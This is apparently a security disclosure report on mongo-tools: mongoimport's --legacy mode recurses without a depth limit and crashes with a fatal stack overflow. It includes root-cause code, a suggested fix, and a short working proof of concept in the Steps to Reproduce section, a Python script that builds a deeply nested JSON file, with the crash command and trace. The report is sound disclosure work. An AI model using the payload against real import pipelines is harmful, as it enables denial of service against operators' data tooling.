# Title

`mongoimport --legacy` crashes with an uncaught `fatal error: stack overflow` on a single deeply-nested JSON array (unbounded mutual recursion in `ConvertLegacyExtJSONValueToBSON`/`ParseLegacyExtJSONValue`)

## Summary

`mongoimport`, when invoked with the `--legacy` flag (`--legacy: use the legacy extended JSON format`, valid for the JSON input type, which is also the default `--type`), parses each input document through a first-party, hand-written recursive-descent JSON parser (`common/json`) and then walks the resulting value tree with a second, independently-recursive pass (`common/bsonutil.GetExtendedBsonD` → `ConvertLegacyExtJSONValueToBSON` ⇄ `ParseLegacyExtJSONValue`) to resolve legacy extended-JSON type markers (`$oid`, `$date`, etc.) into real BSON types. **Neither pass enforces any nesting-depth limit.** A single JSON document containing a deeply nested array (e.g. two million levels of `[`) drives this second, mutually-recursive walk to a genuine Go runtime `fatal error: stack overflow` — not a `panic`, so it is **not recoverable** by any `recover()` in the call chain (and this code path does have one; it does not matter, because a fatal error bypasses `recover()` entirely). The process terminates immediately with exit code 2.

This is the same bug class (CWE-674, unbounded recursion → uncaught stack overflow) as the `mongo-go-driver` extended-JSON finding reported separately from this audit pass, but it lives entirely in **first-party `mongo-tools` code** (`common/bsonutil`), not a dependency, and is reached via a different code path (`--legacy` mode) that bypasses the driver's own extended-JSON parser (and its depth limit) altogether.

## Weakness

CWE-674 (Uncontrolled Recursion) → process-terminating `fatal error: stack overflow`, distinct from and not caught by ordinary `recover()`-based panic handling.

## Authentication Required

**None.** Verified empirically: the target `mongod` in the PoC below was started with no `--auth` flag, and the crash occurs entirely during local parsing of the input file, before any data is sent to the server. `mongoimport` does establish a connection to validate options before streaming documents, but no credentials or privileged operations are required — this crashes just as reliably against an unauthenticated, out-of-the-box `mongod`. As with the other findings from this pass, the real precondition is a **file/data-source trust boundary** (an operator running `mongoimport --legacy` against a JSON file obtained from, or influenced by, an untrusted source), not an authentication boundary.

## Component / Version

- Repository: `mongodb/mongo-tools` (HackerOne scope: **Database Tools**)
- Tag audited: `100.18.0`
- Commit: [`21a342dfee6468ad9350d156d25086da64dd03b1`](https://github.com/mongodb/mongo-tools/commit/21a342dfee6468ad9350d156d25086da64dd03b1)
- Affected code (`common/bsonutil/converter.go`, `common/bsonutil/bsonutil.go`) is old — present since before the 2021 `mongo-tools-common` → `mongo-tools` subpackage merge; no depth limit has ever been added.
- Official binaries: https://www.mongodb.com/try/download/database-tools

## Root cause, with links to the exact code

The `--legacy` flag is defined in
[`mongoimport/options.go#L52`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongoimport/options.go#L52):
```go
Legacy bool `long:"legacy" description:"use the legacy extended JSON format"`
```
and wired into the JSON reader path in
[`mongoimport/json.go#L163-L188`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongoimport/json.go#L163-L188):
```go
func (c JSONConverter) Convert() (bson.D, error) {
	if c.legacyExtJSON {
		return c.convertLegacyExtJSON()
	}
	...
}

func (c JSONConverter) convertLegacyExtJSON() (bson.D, error) {
	document, err := json.UnmarshalBsonD(c.data)          // first recursive pass (common/json)
	...
	bsonD, err := bsonutil.GetExtendedBsonD(document)      // second recursive pass (common/bsonutil)
	...
	return bsonD, nil
}
```

`GetExtendedBsonD` and the two functions it drives into mutual recursion, in
[`common/bsonutil/bsonutil.go#L66-L88`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/common/bsonutil/bsonutil.go#L66-L88) and
[`common/bsonutil/bsonutil.go#L434-L444`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/common/bsonutil/bsonutil.go#L434-L444):
```go
func GetExtendedBsonD(doc bson.D) (bson.D, error) {
	for _, docElem := range doc {
		switch v := docElem.Value.(type) {
		case map[string]any, bson.D:
			bsonValue, err = ParseSpecialKeys(v)
		default:
			bsonValue, err = ConvertLegacyExtJSONValueToBSON(v)   // <-- entry point for arrays
		}
		...
	}
}

func ParseLegacyExtJSONValue(jsonValue any) (any, error) {
	switch v := jsonValue.(type) {
	case map[string]any, bson.D:
		return ParseSpecialKeys(v)
	default:
		return ConvertLegacyExtJSONValueToBSON(v)               // <-- calls back into converter.go
	}
}
```
and [`common/bsonutil/converter.go#L22-L58`](https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/common/bsonutil/converter.go#L22-L58):
```go
func ConvertLegacyExtJSONValueToBSON(x any) (any, error) {
	switch v := x.(type) {
	...
	case []any: // array
		for i, jsonValue := range v {
			bsonValue, err := ParseLegacyExtJSONValue(jsonValue)  // <-- calls back into bsonutil.go
			...
			v[i] = bsonValue
		}
		return v, nil
	...
	}
}
```

`ConvertLegacyExtJSONValueToBSON` and `ParseLegacyExtJSONValue` call each other once per level of array nesting, with **no depth counter anywhere in either function or anywhere in the `common/bsonutil` package** (confirmed by search — no `depth`, `maxDepth`, or nesting-related identifier exists in the package). Each nesting level in the input JSON array costs one full mutual-recursion cycle of stack, and the crash trace below shows exactly that alternating pattern. This is a second, independent unbounded-recursion bug from the same audit pass: the first-pass JSON tokenizer/decoder in `common/json` (used via `json.UnmarshalBsonD`) is *also* unbounded (no `maxNestingDepth` anywhere in that package either), but it is this second `bsonutil` walk that actually blows the stack first in practice, as shown by the trace.

## Steps to Reproduce

Built from the exact `100.18.0` tag source (official binaries were unreachable from my test environment due to unrelated network policy; the local build is behaviorally identical).

```python
N = 2_000_000
payload = '{"a":' + '[' * N + ']' * N + '}'
open('nested_legacy.json', 'w').write(payload)   # ~4 MB file
```

```sh
$ mongoimport --port 27779 --db pocdb --collection legacytest --type=json --legacy --file nested_legacy.json
2026-08-31T00:48:21.530+0000  connected to: mongodb://localhost:27779/
2026-08-31T00:48:24.531+0000  [########################] pocdb.legacytest  3.81MB/3.81MB (100.0%)
runtime: goroutine stack exceeds 1000000000-byte limit
runtime: sp=0x2de3eec2408 stack=[0x2de3eec2000, 0x2de5eec2000]
fatal error: stack overflow

goroutine 44 gp=0x2de1ab14780 m=8 mp=0x2de1ab16008 [running]:
github.com/mongodb/mongo-tools/common/bsonutil.ConvertLegacyExtJSONValueToBSON({0xa79820?, 0x2de1f53f710})
	common/bsonutil/converter.go:22 +0x9f2
github.com/mongodb/mongo-tools/common/bsonutil.ParseLegacyExtJSONValue({0xa79820?, 0x2de1f53f710?})
	common/bsonutil/bsonutil.go:442 +0x5a
github.com/mongodb/mongo-tools/common/bsonutil.ConvertLegacyExtJSONValueToBSON({0xa79820?, 0x2de1f53f728})
	common/bsonutil/converter.go:49 +0x894
github.com/mongodb/mongo-tools/common/bsonutil.ParseLegacyExtJSONValue({0xa79820?, 0x2de1f53f728?})
	common/bsonutil/bsonutil.go:442 +0x5a
... (repeats, alternating, thousands of times) ...
$ echo $?
2
```

Note this is a `fatal error`, printed by the Go runtime itself (`runtime.throw`), not a recovered `panic:` — it terminates the process unconditionally regardless of any `recover()` present in the call stack.

## Impact

Any operator running `mongoimport --legacy` (a documented, supported flag for importing data in the legacy extended-JSON dialect — a realistic scenario for anyone migrating older tooling/scripts, or ingesting third-party JSON exports) against a file from an untrusted or compromised source will have the process crash unrecoverably from a single ~4 MB file costing nothing to produce. Unlike an ordinary panic, this is a hard runtime fatal error — there is no way for `mongoimport`, or any wrapper around it, to catch and gracefully report this failure; it always terminates the process. As with the other findings in this pass, I'm reporting this at the severity the program's own DoS/resource-consumption guidance implies (this is a crash, not data corruption or code execution) rather than overstating it.

## Suggested Fix

Add an explicit depth counter to `ConvertLegacyExtJSONValueToBSON`/`ParseLegacyExtJSONValue` (and, independently, to the `common/json` decoder's `array()`/`arrayInterface()`/`bsonDInterface()` functions, which have the same unbounded-recursion property), rejecting input past a fixed maximum nesting depth (e.g. 200, matching the depth limit the `mongo-go-driver` uses for its own extended-JSON parser) with a normal parse error instead of recursing further.

## Supporting Material

- Companion reports from the same audit pass (separate findings, same repository, same bug class in a different code path): `security-research/mongo-tools/mongorestore-oplog-replay-panic-2026-08-30/`, and the related `security-research/mongo-go-driver/extjson-array-nesting-depth-bypass-2026-08-30/` (dependency, not first-party — reported against `mongo-go-driver` directly)
- Vulnerable mutual recursion: https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/common/bsonutil/converter.go#L22-L58 and https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/common/bsonutil/bsonutil.go#L434-L444
- Entry point: https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/common/bsonutil/bsonutil.go#L66-L88
- `--legacy` flag wiring: https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongoimport/json.go#L163-L188
- Flag definition: https://github.com/mongodb/mongo-tools/blob/21a342dfee6468ad9350d156d25086da64dd03b1/mongoimport/options.go#L52
